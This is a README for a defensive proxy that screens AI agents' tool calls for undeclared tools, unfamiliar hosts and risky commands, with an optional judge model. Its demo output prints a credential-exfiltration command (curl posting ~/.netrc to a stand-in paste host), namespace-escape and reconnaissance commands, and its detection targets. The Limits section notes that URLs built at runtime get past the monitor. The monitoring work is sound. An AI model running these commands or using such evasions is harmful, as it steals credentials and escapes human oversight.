# safeagents

[![safeagents demo](assets/safeagents.gif)](assets/safeagents.mp4)

A small local proxy between your agent and its model server. It checks every tool call the model makes before the harness sees it, and replaces the calls it blocks with a text notice. The harness then sees a plain text reply and runs nothing. Works with Pi, Claude Code, Hermes and with OpenAI Chat Completions and Anthropic Messages, streaming or not, so it fits any harness that lets you set a base URL.

Each tool call goes through three stages:

1. **Request-only checks.** A call is blocked if it uses a tool the request never declared, or if its arguments contain a host (URL or bare IP) that appears nowhere in the conversation: not in the system prompt, the user messages, the tool results or the tool definitions. The model's own earlier turns don't count. This catches a model "calling home" to a URL it produced from its weights, as in [Cohere's Qwen3.8 report](https://cohere.com/blog/concerning-behaviour-popular-open-weight-ai-model).
2. **[atif-scan](https://github.com/huggingface/atif-scan) checks.** The conversation becomes an ATIF trace and the pending call its last step, so atif-scan's detectors run on it. Examples: reading `/proc/1/environ`, `curl --noproxy`, a Kubernetes service-account token, or `unshare`/`nsenter` (a check safeagents adds). Findings at or above `--block-severity` (default `high`) are blocked. Milder ones make the call suspicious.
3. **Decision model** (optional). Suspicious calls go to a judge model, which answers `allow` or `block` as constrained JSON. Without a judge, suspicious calls are only logged.

The judge only sees what the user wrote, the tool call and the findings. It never sees the agent's reasoning, its prose or tool results, since an agent that wants a call to run would argue its case there. The judge can add blocks but never lift one, and it is only asked about calls that already raised a finding, so clean calls cost nothing.

## Install

Needs [atif-scan](https://github.com/huggingface/atif-scan).

```
uv sync
uv run safeagents --upstream <url> [options]
```

| flag | meaning |
| --- | --- |
| `--listen` | address to listen on (default `127.0.0.1:8787`) |
| `--allow-host HOST` | extra host calls may reach, subdomains included (repeatable) |
| `--log-only` | report flagged calls without changing responses |
| `--no-scan` | request-only checks, no atif-scan |
| `--block-severity` | `low`, `medium`, `high` or `critical`: findings at or above it block without asking the judge |
| `--judge-url`, `--judge-model` | the decision model; its API key comes from `SAFEAGENTS_JUDGE_API_KEY` |
| `--judge-fail-closed` | block suspicious calls when the judge errors or gives no verdict (default: allow and log) |

The built-in host allowlist covers loopback, GitHub, PyPI, Hugging Face, npm and crates.io.

## Usage

Step-by-step guides for 12 coding agents (OpenClaw, OpenCode, Cline, Hermes, pi, OpenHands, Qwen Code, Copilot and more) are in [docs/](docs/README.md).

**llama.cpp** (or any OpenAI-compatible server):

```
llama-server -m model.gguf --jinja --port 8080
uv run safeagents --upstream http://localhost:8080
OPENAI_BASE_URL=http://127.0.0.1:8787/v1 your-agent
```

**With a judge** (any OpenAI-compatible server, ideally a different model from the agent's):

```
llama-server -hf <judge-model-gguf> --jinja --port 8081
uv run safeagents --upstream http://localhost:8080 --judge-url http://localhost:8081/v1
```

**Claude Code via OpenRouter** (Anthropic-compatible endpoint):

```
uv run safeagents --upstream https://openrouter.ai/api
ANTHROPIC_BASE_URL=http://127.0.0.1:8787 ANTHROPIC_AUTH_TOKEN=$OPENROUTER_API_KEY claude
```

**Claude Code with the Anthropic API** (terminal):

```
uv run safeagents --upstream https://api.anthropic.com --log-only
ANTHROPIC_BASE_URL=http://127.0.0.1:8787 claude
```

**Claude Code in VS Code:** start the proxy, either as above or from this repo with *Tasks: Run Task* → `safeagents: log-only` (or `safeagents: block`), then add this to your VS Code user settings JSON (*Preferences: Open User Settings (JSON)*) and run *Developer: Reload Window*:

```json
"claudeCode.environmentVariables": [
  { "name": "ANTHROPIC_BASE_URL", "value": "http://127.0.0.1:8787" }
]
```

Every Claude Code request now goes through the proxy, so keep it running: if it stops, Claude Code can't reach the model. Remove the setting and reload to go back.

All request headers, `anthropic-beta` included, are forwarded unchanged, so both an API key and a claude.ai subscription login keep working. With a custom base URL, Claude Code turns off Remote Control, and its WebFetch domain check still goes straight to `api.anthropic.com`.

Start with `--log-only`. Claude Code declares all its tools on every request, so the undeclared-tool check shouldn't fire, but the host check will flag WebFetch calls to docs Claude knows without being told, such as `docs.rs`. URLs from search results, files Claude read, CLAUDE.md or your own messages pass. Watch the `flagged` lines for a while, add the hosts you trust with `--allow-host`, then drop `--log-only` to start blocking.

The proxy's terminal shows a histogram of verdicts and the latest tool calls, redrawn as calls come in:

```
╔═  SAFEAGENTS  ═══════════════════════════════════════════════════════════════════════╗
║ REQUESTS 000015   CALLS 000015                                                       ║
║                                                                                      ║
║ PASS       8  53% ███████████████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ ║
║ WARN       3  20% █████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ ║
║ FLAG       0   0% ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ ║
║ BLOCK      4  27% ██████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ ║
╚══════════════════════════════════════  127.0.0.1:8787 -> https://api.anthropic.com  ═╝
╔═  CALLS  ════════════════════════════════════════════════════════════════════════════╗
║ 17:53:21  WARN   Bash        unshare -Urm sh -c 'mount -t tm…  safeagents.namespace… ║
║ 17:53:21  BLOCK  Bash        curl --noproxy '*' -d @~/.netrc…  host `paste.example.… ║
║ 17:53:21  BLOCK  shell_exec  id && uname -a                    undeclared tool       ║
║ 17:53:21  PASS   WebFetch    https://docs.example.org/parser…                        ║
║ 17:53:21  PASS   Bash        ruff check src && pytest -q                             ║
╚══════════════════════════════════════════════════════════════════════════════════════╝
```

`WARN` calls ran but raised an atif-scan finding; `FLAG` ones would have been blocked but ran because of `--log-only`. Piped to a file, it writes one plain line per call instead.

To see it react without a real agent, run simulated sessions in which a fake model mixes ordinary calls with the misuse from the Cohere report (nothing is executed). Sixteen agents run at once by default; set how many with `--agents` and how fast they go with `--delay`:

```
uv run safeagents --upstream http://127.0.0.1:18081     # terminal 1
uv run python scripts/simulate.py                        # terminal 2
```

## How streaming works

Each tool call is held until its arguments are complete, then either released unchanged (byte for byte) or replaced. Harnesses only run a tool call once it is complete, so this adds no latency to the agent. Text is forwarded as it arrives.

## Cost

atif-scan runs once per tool call, on the user turns and the last 20 agent turns. On an M-series Mac that's about 10 to 20 ms per call, whatever the session length. The judge adds one model call per suspicious call only.

## Limits

- It only sees what the model *asks for*. A script that builds a URL at runtime (`"ht"+"tps://"...`) or a code-execution tool that fetches things indirectly gets past it. Pair it with default-deny egress in the sandbox.
- Host extraction covers `scheme://host` URLs and IPv4 literals. Bare domains such as `curl evil.com` are not caught yet.
- A host the model legitimately knows (say, a docs site the user never mentioned) is blocked. Use `--allow-host` or `--log-only`.
- The OpenAI Responses API is not handled yet.

## Tests

```
uv run pytest
```
